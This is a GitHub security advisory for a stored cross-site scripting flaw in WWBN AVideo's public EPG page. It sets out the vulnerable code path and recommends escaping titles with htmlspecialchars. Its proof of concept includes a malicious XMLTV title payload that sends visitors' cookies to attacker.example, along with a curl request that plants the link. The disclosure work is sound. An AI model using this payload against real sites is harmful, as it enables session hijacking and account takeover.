# [M] WWBN AVideo has Stored XSS via Malicious EPG XML Program Titles in AVideo EPG Page

## Summary
Severity: Medium
Advisory: GHSA-rqp3-gf5h-mrqx
CVE: CVE-2026-39367
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-rqp3-gf5h-mrqx
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

AVideo's EPG (Electronic Program Guide) feature parses XML from user-controlled URLs and renders programme titles directly into HTML without any sanitization or escaping. A user with upload permission can set a video's `epg_link` to a malicious XML file whose `<title>` elements contain JavaScript. This payload executes in the browser of any unauthenticated visitor to the public EPG page, enabling session hijacking and account takeover.

## Details

The vulnerability spans three files in the data flow:

**1. Entry point — `objects/videoAddNew.json.php:117-119`**

The `epg_link` parameter is stored with only a URL format check:

```php
if (empty($_POST['epg_link']) || isValidURL($_POST['epg_link'])) {
    $obj->setEpg_link($_POST['epg_link']);
}
```

This requires `User::canUpload()` (line 10) — not admin, just basic upload permission.

**2. XML parsing — `objects/EpgParser.php:321`**

Programme titles are extracted as raw strings with no sanitization:

```php
$this->epgdata[$grouper ?: 0] = [
    'title' => (string) $element->title,
    // ...
];
```

**3. Sink — `plugin/PlayerSkins/epg.php:343-351`**

Programme titles are interpolated directly into HTML output without `htmlspecialchars()` or any escaping:

```php
} else if ($width <= $minimumWidth1Dot) {
    $text = "<abbr title=\"{$program['title']}\">.</abbr>";          // attribute injection
} else if ($width <= $minimumWidth) {
    $text = "<abbr title=\"{$program['title']}\"><small ...";        // attribute injection
} else if ($width <= $minimumSmallFont) {
    $text = "<small class=\"small-font\">{$program['title']}<div>..."; // HTML injection
} else {
    $text = "{$program['title']}<div>...";                            // HTML injection
}
```

Notably, the channel `display-name` **is** sanitized via `safeString()` at line 151, but programme titles are not — an apparent oversight.

The EPG page (`epg.php`) requires no authentication to access, and the rendered output is cached at line 634 (`ObjectYPT::setCache`), so the XSS payload persists in cache even if the original malicious XML is later removed.

## PoC

**Step 1:** Host a malicious XMLTV file at an attacker-controlled URL:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tv>
  <channel id="ch1">
    <display-name>Test Channel</display-name>
  </channel>
  <programme start="20260404060000 +0000" stop="20260404070000 +0000" channel="ch1">
    <title><![CDATA[<img src=x onerror=fetch('https://attacker.example/steal?c='+document.cookie)>]]></title>
  </programme>
</tv>
```

**Step 2:** Create a video with the malicious EPG link (requires upload permission):

```bash
curl -s -b 'PHPSESSID=UPLOAD_USER_SESSION' \
  'https://target.example/objects/videoAddNew.json.php' \
  -d 'title=LiveStream&videoLink=https://example.com/stream.m3u8&epg_link=https://attacker.example/evil.xml&categories_id=1'
```

**Step 3:** Any visitor (unauthenticated) browsing the EPG page triggers the XSS:

```
https://target.example/plugin/PlayerSkins/epg.php
```

The `<img onerror>` payload executes in the browser of every visitor, exfiltrating cookies and session tokens.

## Impact

- **Session hijacking**: Any visitor's session cookies are exfiltrated, including administrators
- **Account takeover**: Stolen admin sessions allow full platform control
- **Persistent**: The XSS payload is cached server-side and fires for every page visitor without further interaction
- **Wide blast radius**: The EPG page is publicly accessible with no authentication required

## Recommended Fix

Escape all programme data before rendering in HTML. In `plugin/PlayerSkins/epg.php`, apply `htmlspecialchars()` to programme titles before interpolation:

```php
// Around line 340, before the width checks:
$safeTitle = htmlspecialchars($program['title'], ENT_QUOTES, 'UTF-8');

// Then use $safeTitle instead of $program['title']:
} else if ($width <= $minimumWidth1Dot) {
    $text = "<abbr title=\"{$safeTitle}\">.</abbr>";
} else if ($width <= $minimumWidth) {
    $text = "<abbr title=\"{$safeTitle}\"><small class=\"duration\">{$minutes} Min</small></abbr>";
} else if ($width <= $minimumSmallFont) {
    $text = "<small class=\"small-font\">{$safeTitle}<div><small class=\"duration\">{$minutes} Min</small></div></small>";
} else {
    $text = "{$safeTitle}<div><small class=\"duration\">{$minutes} Min</small></div>";
}
```

Additionally, consider sanitizing all EPG XML fields at parse time in `EpgParser.php:316-330` to defend in depth.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-rqp3-gf5h-mrqx
- https://nvd.nist.gov/vuln/detail/CVE-2026-39367
- https://github.com/WWBN/AVideo/commit/e0212add4aad0f1e97758a4b4fdc57df58ce68e8
- https://github.com/WWBN/AVideo
